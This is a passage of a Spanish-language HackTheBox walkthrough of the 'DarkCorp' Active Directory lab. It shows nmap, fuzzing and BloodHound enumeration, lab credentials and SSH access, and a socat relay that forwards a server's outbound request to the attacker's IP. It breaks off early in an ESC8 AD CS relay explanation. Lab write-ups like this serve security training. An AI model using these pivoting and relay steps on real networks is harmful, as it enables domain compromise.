| gc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049REFSS0NPUlAtREMt
| MDEtQ0EsQ049REMtMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya2NvcnAsREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBxAYIKwYBBQUHAQEEgbcwgbQwgbEGCCsGAQUFBzAC
| hoGkbGRhcDovLy9DTj1EQVJLQ09SUC1EQy0wMS1DQSxDTj1BSUEsQ049UHVibGlj
| JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
| Qz1kYXJrY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNz
| PWNlcnRpZmljYXRpb25BdXRob3JpdHkwOAYDVR0RAQH/BC4wLIISREMtMDEuZGFy
| a2NvcnAuaHRiggxkYXJrY29ycC5odGKCCGRhcmtjb3JwME8GCSsGAQQBgjcZAgRC
| MECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0zNDMyNjEwMzY2LTIxNjMzMzY0
| ODgtMzYwNDIzNjg0Ny0xMDAwMA0GCSqGSIb3DQEBCwUAA4ICAQCKmQ0FHS5X6atP
| pooTkOmuP5ebsoINxwfx03DKrFY23bDG0Zv7rH92UW4ptkLZ5Vq4W2zHGd9miMAu
| LyGhL8r/mynrC9eaQZykP83hNKidcL8hiaoXi0VkU76oAMSUaI8IjD0iZp+xNRQW
| YOMf2aRDqjVHof9mYJJc94Uobqm/fYaCBS6FnKtXjI1JsCMlKhGBJVMXCu7krOVc
| 47wK/MlP1YH3CaQ1qIFnaxiRPrGM5q1igER1fu4x8ZUqi2I29IAKwlNtvwuQsIWF
| HWTL6jYURAJqNt6rf2llbRKNsA9wWMEh4I3cMXS52IJPSB9r4dpT0Hv6sD+D+azX
| /YNJzUUO+h6gC1B20z6cPVAAQe3yozKRMSh3ja+2EI+9OPgOVDK8RbF2rs8DgtRK
| kys/tCtLZjZaBZ0UDFCr3Uliu2JEcIF5f4Pf2y7VA6Ep8cR+vd4ai4UPr+1wv2DH
| UCHzrLsCiRV4kld9gHkhX8bWlGtO8evo4qV1yZ2KaH2M1zf17VVKUNiaNFev1SGb
| 96Siu0GXXz/lHwrJyfdZkCBp8U7Z5dD0jNwF+0F5f+w3KpPXTXuogw4IRR4ug8A4
| cp+HB0IGKK2YCJZLhjFdBJESYGxtWQBun73Ryt76SlUUSQ1eIUypYOJA78wgMA8A
| w6Gt7i+UoIw1vr6SbQVMyuiM3umSvA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: darkcorp.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC-01.darkcorp.htb, DNS:darkcorp.htb, DNS:darkcorp
| Issuer: commonName=DARKCORP-DC-01-CA/domainComponent=darkcorp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-22T12:09:55
| Not valid after:  2124-12-29T12:09:55
| MD5:     f433 7d4f 87a0 c19d 7a7a 7232 111b 499b
| SHA-1:   fede 6913 b730 2f06 8beb c623 2271 afa6 7699 2958
| SHA-256: 0313 e714 8e9f 724e bf9a b265 9633 de1c e784 6568 eea0 8859 b058 c0fd 42ce 9e45
| -----BEGIN CERTIFICATE-----
| MIIHAjCCBOqgAwIBAgITKAAAAASG76NV2bWBpwABAAAABDANBgkqhkiG9w0BAQsF
| ADBLMRMwEQYKCZImiZPyLGQBGRYDaHRiMRgwFgYKCZImiZPyLGQBGRYIZGFya2Nv
| cnAxGjAYBgNVBAMTEURBUktDT1JQLURDLTAxLUNBMCAXDTI1MDEyMjEyMDk1NVoY
| DzIxMjQxMjI5MTIwOTU1WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAruEnJwmyL0DTlX8q4JpjxGIoMuVSEqhPkCsgQP8xeIcrskg1WNjoaCEvRExW
| lb7bsq2/vLpqBIIs3ngr6Q8mzmOUhyQgTIcq6QA+dL8JzLBFQrClQ02f7G4g6g1V
| pw1UxwjeOmrMMkqw6r2Aoty3wYyjeXwXAMIvztE2ETyHdiJ5Veto6I8Yz7E+EQAM
| HUnXm17llz1Zb/ii4/CpyretE3M1AhrvLi5Oi5UYNntcXrH4B3GrVlXBkeF1uK+j
| Ol8TkrtrR2R9f+2Z3ChX6Pk0tCzIsxv9c+4v6V27YNFb98ClU6Ck1f+vRatzZbxq
| oZwNrFky4HHGIlJBUqcjvg3nUQIDAQABo4IDJjCCAyIwNwYJKwYBBAGCNxUHBCow
| KAYgKwYBBAGCNxUIhaDcTYXg6mmCmYk1gZzNOoWG7hwDASECAW4CAQIwMgYDVR0l
| BCswKQYIKwYBBQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4G
| A1UdDwEB/wQEAwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsG
| AQUFBwMBMAwGCisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUm6Jgy+5c
| zWivRiAYCFIMQhLzuEMwHwYDVR0jBBgwFoAUveFrnur+AiuTtRhMtL2zcnlaQG0w
| gc4GA1UdHwSBxjCBwzCBwKCBvaCBuoaBt2xkYXA6Ly8vQ049REFSS0NPUlAtREMt
| MDEtQ0EsQ049REMtMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9ZGFya2NvcnAsREM9aHRi
| P2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFzcz1jUkxE
| aXN0cmlidXRpb25Qb2ludDCBxAYIKwYBBQUHAQEEgbcwgbQwgbEGCCsGAQUFBzAC
| hoGkbGRhcDovLy9DTj1EQVJLQ09SUC1EQy0wMS1DQSxDTj1BSUEsQ049UHVibGlj
| JTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixE
| Qz1kYXJrY29ycCxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNz
| PWNlcnRpZmljYXRpb25BdXRob3JpdHkwOAYDVR0RAQH/BC4wLIISREMtMDEuZGFy
| a2NvcnAuaHRiggxkYXJrY29ycC5odGKCCGRhcmtjb3JwME8GCSsGAQQBgjcZAgRC
| MECgPgYKKwYBBAGCNxkCAaAwBC5TLTEtNS0yMS0zNDMyNjEwMzY2LTIxNjMzMzY0
| ODgtMzYwNDIzNjg0Ny0xMDAwMA0GCSqGSIb3DQEBCwUAA4ICAQCKmQ0FHS5X6atP
| pooTkOmuP5ebsoINxwfx03DKrFY23bDG0Zv7rH92UW4ptkLZ5Vq4W2zHGd9miMAu
| LyGhL8r/mynrC9eaQZykP83hNKidcL8hiaoXi0VkU76oAMSUaI8IjD0iZp+xNRQW
| YOMf2aRDqjVHof9mYJJc94Uobqm/fYaCBS6FnKtXjI1JsCMlKhGBJVMXCu7krOVc
| 47wK/MlP1YH3CaQ1qIFnaxiRPrGM5q1igER1fu4x8ZUqi2I29IAKwlNtvwuQsIWF
| HWTL6jYURAJqNt6rf2llbRKNsA9wWMEh4I3cMXS52IJPSB9r4dpT0Hv6sD+D+azX
| /YNJzUUO+h6gC1B20z6cPVAAQe3yozKRMSh3ja+2EI+9OPgOVDK8RbF2rs8DgtRK
| kys/tCtLZjZaBZ0UDFCr3Uliu2JEcIF5f4Pf2y7VA6Ep8cR+vd4ai4UPr+1wv2DH
| UCHzrLsCiRV4kld9gHkhX8bWlGtO8evo4qV1yZ2KaH2M1zf17VVKUNiaNFev1SGb
| 96Siu0GXXz/lHwrJyfdZkCBp8U7Z5dD0jNwF+0F5f+w3KpPXTXuogw4IRR4ug8A4
| cp+HB0IGKK2YCJZLhjFdBJESYGxtWQBun73Ryt76SlUUSQ1eIUypYOJA78wgMA8A
| w6Gt7i+UoIw1vr6SbQVMyuiM3umSvA==
|_-----END CERTIFICATE-----
54018/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC-01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| nbstat: NetBIOS name: DC-01, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:84:03:00 (Microsoft)
| Names:
|   DC-01<00>            Flags: <unique><active>
|   DARKCORP<00>         Flags: <group><active>
|   DARKCORP<1c>         Flags: <group><active>
|   DC-01<20>            Flags: <unique><active>
|   DARKCORP<1b>         Flags: <unique><active>
| Statistics:
|   00 15 5d 84 03 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22330/tcp): CLEAN (Timeout)
|   Check 2 (port 22957/tcp): CLEAN (Timeout)
|   Check 3 (port 28117/udp): CLEAN (Timeout)
|   Check 4 (port 13643/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2026-05-29T19:29:58
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:30
Completed NSE at 15:30, 0.00s elapsed
Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.60 seconds
```

La captura de `nmap` revela servicios de Active Directory, como `dns`, `kerberos` y `ldap`. 

Además, veremos información del host y del dominio `darkcorp.htb` (aunque ya lo habíamos visto desde el `LFI`), frente a esta información podemos intuir que estamos frente a un Controlador de Dominio.

Agregaremos una nueva entrada a nuestro archivo `/etc/hosts` para resolver correctamente el dominio a través de DNS

``` bash
export DOMAIN=darkcorp.htb
export FQDN=DC-01.darkcorp.htb

echo "$DC_IP $FQDN $DOMAIN" | sudo tee -a /etc/hosts
172.16.20.1 DC-01.darkcorp.htb darkcorp.htb
```

#### WEB-01

Como existe otro host activo en la IP `.2`, podemos intentar escanear puertos en él para descubrir servicios expuestos

``` bash
rustscan -a 172.16.20.2 --ulimit 5000 -- -sC -sV -Pn -n -oN WEB-01_services

Nmap scan report for 172.16.20.2
Host is up (0.34s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5000/tcp  open  http          Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: darkcorp
|   NetBIOS_Domain_Name: darkcorp
|   NetBIOS_Computer_Name: WEB-01
|   DNS_Domain_Name: darkcorp.htb
|   DNS_Computer_Name: WEB-01.darkcorp.htb
|   DNS_Tree_Name: darkcorp.htb
|_  Product_Version: 10.0.20348
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
|_http-server-header: Microsoft-IIS/10.0
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-29T19:50:28
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WEB-01, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:84:03:03 (Microsoft)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.25 seconds
```

Veremos más servicios relacionados a Windows, aunque esta vez no veremos servicios de un DC como `ldap`, `dns`, etc.

Nuevamente añadiremos esta información a nuestro archivo `/etc/hosts` para aplicar correctamente la resolución DNS

``` bash
echo "172.16.20.2 WEB-01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts
172.16.20.2 WEB-01.darkcorp.htb darkcorp.htb
```

### Domain Auth

Intentaremos validar estas credenciales a nivel de dominio en los hosts Windows. Aunque en mi caso dejé la enumeración del dominio a nivel de Active Directory para un poco más adelante

``` bash
nxc smb alive_hosts.txt -u victor.r -p 'victor1gustavo@#' 
SMB         172.16.20.2     445    WEB-01           [*] Windows Server 2022 Build 20348 x64 (name:WEB-01) (domain:darkcorp.htb) (signing:False) (SMBv1:None)
SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         172.16.20.2     445    WEB-01           [+] darkcorp.htb\victor.r:victor1gustavo@# 
SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\victor.r:victor1gustavo@# 
Running nxc against 3 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

De forma casi inmediata lanzaremos una herramienta que nos permita recolectar información del dominio

## Web Enumeration

Como ambos hosts de la red interna tienen un servicio `http` corriendo en el puerto `80`, lanzaremos `whatweb` para enumerar las tecnologías web que el servidor pueda estar ejecutando

### DC-01

Comenzaremos analizando el host `DC-01`. Recordemos que la captura de `nmap` reveló que el host `DC-01` posee dos servicios web, uno en el puerto `80/http` y otro en el puerto `443/https`

``` bash
whatweb http://172.16.20.1

http://172.16.20.1 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.22.1], IP[172.16.20.1], Meta-Refresh-Redirect[http://drip.htb/], nginx[1.22.1]
http://drip.htb/ [302 Found] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.5.241], RedirectLocation[index], Title[Redirecting...], nginx[1.22.1]
http://drip.htb/index [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com,support@drip.htb], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.5.241], PoweredBy[Roundcube], Script, Title[DripMail], nginx[1.22.1]
```

 El servidor `HTTP` del puerto `80` parece correr el servicio web que explotamos al inicio, ya que redirige a `drip.htb`.

En cuanto al servicio `https` corriendo el el puerto `443`, parece ser un servidor `IIS`

``` bash
whatweb https://172.16.20.1
     
https://172.16.20.1 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[172.16.20.1], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

Si visitamos la página web desde un navegador, veremos la página por defecto de `IIS`

![image-center](/assets/images/posts/darkcorp-35-hackthebox.png)
{: .align-center}

#### Fuzzing

Si realizaremos un escaneo de directorios y/o archivos posibles mediante `fuzzing`, veremos que el servidor posee la ruta `/certsrv`

> La ruta `/certsrv` en `IIS` corresponde a la interfaz web de `Servicios de Certificados de Active Directory` (`ADCS`). 
> 
> Se utiliza para la inscripción y gestión de certificados digitales a través de un navegador web.
{: .notice--info}

``` bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -u "https://$DC_IP/FUZZ" -k 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://172.16.20.1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 333ms]
certsrv                 [Status: 401, Size: 1293, Words: 81, Lines: 30, Duration: 1923ms]
certenroll              [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 813ms]
:: Progress: [4750/4750] :: Job [1/1] :: 208 req/sec :: Duration: [0:00:33] :: Errors: 0 ::
```

El servidor nos denegará el acceso a ella, por lo que nos queda continuar enumerando. Sin embargo, puede ser útil tener este dato en cuenta

### WEB-01

Continuaremos enumerando el host `WEB-01`, donde lanzaremos un escaneo preliminar de tecnologías web

```
whatweb http://172.16.20.2 

http://172.16.20.2 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[172.16.20.2], Microsoft-IIS[10.0], Title[IIS Windows Server], X-Powered-By[ASP.NET]
```

En cuanto al servicio en el host `WEB-01`, este corre un servidor `IIS`. Si visitamos la web, veremos la página por defecto

![image-center](/assets/images/posts/darkcorp-36-hackthebox.png)
{: .align-center}

### (Failed) Fuzzing

Si intentamos fuzzear este servidor web, solamente veremos una ruta por defecto de `IIS` (`aspnet_client`)

``` bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -u "http://172.16.20.2/FUZZ"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://172.16.20.2/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

aspnet_client           [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 177ms]
:: Progress: [4750/4750] :: Job [1/1] :: 123 req/sec :: Duration: [0:00:25] :: Errors: 0 ::
```

### Windows Auth

Recordemos que el host `WEB-01` además posee un servicio `HTTP` en el puerto `5000`, aunque está configurado para requerir autenticación basada en Windows

```
whatweb http://172.16.20.2:5000
http://172.16.20.2:5000 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[172.16.20.2], Microsoft-IIS[10.0], Title[401 - Unauthorized: Access is denied due to invalid credentials.], WWW-Authenticate[Negotiate, NTLM], X-Powered-By[ASP.NET]
```

Si visitamos el servicio web en el puerto `5000`, el servidor nos solicitará credenciales

![image-center](/assets/images/posts/darkcorp-37-hackthebox.png)
{: .align-center}


## Web Access as `victor.r` - `WEB-01`

Como tenemos credenciales válidas a nivel de dominio, podremos autenticarnos en el puerto `5000` como el usuario `victor.r`

![image-center](/assets/images/posts/darkcorp-38-hackthebox.png)
{: .align-center}

Al ingresar, el servidor nos lleva a la siguiente plataforma. Un `Dashboard` donde podremos monitorear sistemas internos

![image-center](/assets/images/posts/darkcorp-39-hackthebox.png)
{: .align-center}

### Logs

Al navegar sobre la barra superior, notaremos que exsite una ruta `/export-logs`, la cual podemos visitar para obtener un reporte de los sistemas

``` bash
curl -s --ntlm -u 'DARKCORP\victor.r:victor1gustavo@#' 'http://web-01.darkcorp.htb:5000/export-logs' | head
timestamp,server,status,response_time_ms
2024-12-01 00:00:00,db-02.darkcorp.htb,DOWN,0
2024-12-01 00:05:00,web-01.darkcorp.htb,UP,417
2024-12-01 00:10:00,web-03.darkcorp.htb,DOWN,0
2024-12-01 00:15:00,db-01.darkcorp.htb,DOWN,0
2024-12-01 00:20:00,db-02.darkcorp.htb,DOWN,0
2024-12-01 00:25:00,web-03.darkcorp.htb,DOWN,0
2024-12-01 00:30:00,db-01.darkcorp.htb,DOWN,0
2024-12-01 00:35:00,web-02.darkcorp.htb,DOWN,0
2024-12-01 00:40:00,web-03.darkcorp.htb,UP,225
```

### Check Status

Además, desde  la ruta `/check` podremos comprobar el estado de los servicios para verificar si están activos

![image-center](/assets/images/posts/darkcorp-40-hackthebox.png)
{: .align-center}

Podemos hacer una comprobación rápida a través de esta funcionalidad. El botón `Check` verificará el estado del host a través del puerto

![image-center](/assets/images/posts/darkcorp-41-hackthebox.png)
{: .align-center}

### Testing

Si especificamos un puerto en un host que sabemos que no responderá (como el puerto `8080`) en la máquina `drip`, veremos un mensaje de error

![image-center](/assets/images/posts/darkcorp-42-hackthebox.png)
{: .align-center}

### Catch Connection

Podemos intentar aprovechar este error para redirigir esta conexión desde el puerto `8080` de `drip` hacia nosotros.

> Necesitaremos abrir un pureto en nuestra máquina para recibir esa conexión: `nc -lvnp 8080`
{: .notice--danger}

``` bash
# copy socat to target machine
sshpass -p 'ThePlague61780' scp -oStrictHostKeyChecking=no socat ebelford@drip.htb:/tmp

# ssh shell
sshpass -p 'ThePlague61780' ssh -oStrictHostKeyChecking=no ebelford@drip.htb

ebelford@drip:~$ cd /tmp
ebelford@drip:/tmp$ chmod +x socat
ebelford@drip:/tmp$ ./socat TCP-LISTEN:8080,fork TCP:10.10.15.30:8080
```

Al hacer clic en `Check!` en la web, recibiremos una solicitud HTTP proveniente del host `WEB-01` hecha con la librería `requests` de `python`

``` bash
Connection from 10.129.232.7:49986
GET / HTTP/1.1
Host: drip.darkcorp.htb:8080
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```


## Domain Enumeration

Ahora que ya enumeramos los servicios web y comprendimos un poco mejor la red, procederemos a enumerar el dominio.

### BloodHound

Como las credenciales de `victor.r` funcionaron para autenticarnos a nivel de dominio, las utilizaremos para lanzar una herramienta que recolecte información del mismo y la visualizaremos en `BloodHound` ``

> Para este paso podemos emplear herramientas como `rusthound-ce`, `bloodhound-ce-python`, etc.
{: .notice--warning}

``` bash
rusthound-ce -d darkcorp.htb -u 'victor.r' -p 'victor1gustavo@#' --zip                   
---------------------------------------------------
Initializing RustHound-CE at 17:44:40 on 05/29/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-29T21:44:40Z INFO  rusthound_ce] Verbosity level: Info
[2026-05-29T21:44:40Z INFO  rusthound_ce] Collection method: All
[2026-05-29T21:44:41Z INFO  rusthound_ce::ldap] Connected to DARKCORP.HTB Active Directory!
[2026-05-29T21:44:41Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-05-29T21:44:41Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-29T21:44:43Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=darkcorp,DC=htb
[2026-05-29T21:44:43Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-29T21:44:50Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=darkcorp,DC=htb
[2026-05-29T21:44:50Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-29T21:44:59Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=darkcorp,DC=htb
[2026-05-29T21:44:59Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-29T21:45:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=darkcorp,DC=htb
[2026-05-29T21:45:00Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-05-29T21:45:00Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=darkcorp,DC=htb
[2026-05-29T21:45:00Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
⠁ Parsing LDAP objects: 41%                                                                                                                                 [2026-05-29T21:45:00Z INFO  rusthound_ce::objects::enterpriseca] Found 11 enabled certificate templates
[2026-05-29T21:45:00Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 13 users parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 62 groups parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 3 computers parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 4 ous parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 3 gpos parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 33 certtemplates parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2026-05-29T21:45:00Z INFO  rusthound_ce::json::maker::common] .//20260529174500_darkcorp-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 17:45:00 on 05/29/26! Happy Graphing!
```

### Active Directory Certificate Services (ADCS)

Sumado a nuestra intuición al enumerar el servidor web del DC, todo parece apuntar a que el servicio de certificados de Active Directory (`ADCS`) se encuentra activo

![image-center](/assets/images/posts/darkcorp-43-hackthebox.png)
{: .align-center}

Enumeraremos el servicio `ADCS` buscando plantillas que podamos aprovechar para movernos lateralmente por el dominio o que nos puedan ser de utilidad

``` bash
certipy find -enabled -u "victor.r@$DOMAIN" -p 'victor1gustavo@#' -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'DARKCORP-DC-01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...

<SNIP>
Certificate Authorities
  0
    CA Name                             : DARKCORP-DC-01-CA
    DNS Name                            : DC-01.darkcorp.htb
    Certificate Subject                 : CN=DARKCORP-DC-01-CA, DC=darkcorp, DC=htb
    Certificate Serial Number           : 27637AF630C1D39945283AF47C89040C
    Certificate Validity Start          : 2024-12-29 23:24:10+00:00
    Certificate Validity End            : 2125-01-22 12:18:28+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : DARKCORP.HTB\Administrators
      Access Rights
        ManageCa                        : DARKCORP.HTB\Administrators
                                          DARKCORP.HTB\Domain Admins
                                          DARKCORP.HTB\Enterprise Admins
        ManageCertificates              : DARKCORP.HTB\Administrators
                                          DARKCORP.HTB\Domain Admins
                                          DARKCORP.HTB\Enterprise Admins
        Enroll                          : DARKCORP.HTB\Authenticated Users
    [*] Remarks
      ESC8                              : Channel Binding couldn't be verified for HTTPS Web Enrollment. For manual verification, request a certificate via HTTPS with Channel Binding disabled and observe if the request succeeds or is rejected.
```


## Abusing AD CS - `ESC8` Technique

`ESC8` es una técnica de escalada de privilegios que abusa de la interfaz web del Servicio de Certificados de Active Direectory (`AD CS`), la cual es vulnerable a ataques de retransmisión NTLM (`NTLM Relay`).

De esta forma, un atacante puede suplantar la identidad de una cuenta que se autentica mediante `NTLM`, accediendo a esta interfaz web y solicitando certificados en el nombre de esta cuenta, permitiendo la escalada de privilegios dentro de un dominio de Active Directory

### Understanding Vulnerability

Para comprender cómo funciona esta técnica, necesitamos primero entender una serie de factores y condiciones que la hacen explotable.

> `AD CS` admite varios métodos de inscripción basados ​​en `HTTP` mediante roles de servidor adicionales que los administradores pueden instalar opcionalmente.
> 
> - Interfaz web de inscripción de certificados (`Certificate Enrollment Web Interface`).
> - Servicio de inscripción de certificados (`Certificate Enrollment Service` o `CES`), que opera en conjunto con la Directiva de Inscripción de Certificados (`Certificate Enrollment Policy` o `CEP`).
> 
> ([`specterops.io`](https://specterops.io/blog/2021/06/17/certified-pre-owned/#48bd:~:text=but-,AD,role))
{: .notice--info}

#### Pre-conditions

La condición principal que debe cumplirse es la prescencia del servicio web de inscripción habilitado en el servidor `AD CS`. 

